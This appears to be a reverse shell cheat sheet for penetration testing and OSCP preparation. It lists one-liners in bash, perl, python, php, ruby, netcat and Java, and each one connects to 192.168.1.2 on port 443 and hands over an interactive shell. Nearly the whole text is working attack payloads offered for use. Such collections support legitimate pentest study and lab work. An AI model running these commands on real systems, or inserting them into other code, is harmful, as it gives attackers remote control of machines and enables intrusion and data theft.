# ReverseShellFULL
Reverse Shell collection for: Pentesting - OSCP



## bash
bash -i >& /dev/tcp/192.168.1.2/443 0>&1

## perl
perl -e 'use Socket;$i="192.168.1.2";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

## python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

## php
php -r '$sock=fsockopen("192.168.1.2",443);exec("/bin/sh -i <&3 >&3 2>&3");'

## ruby
ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

## netcat
nc -e /bin/sh 192.168.1.2 443

## java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
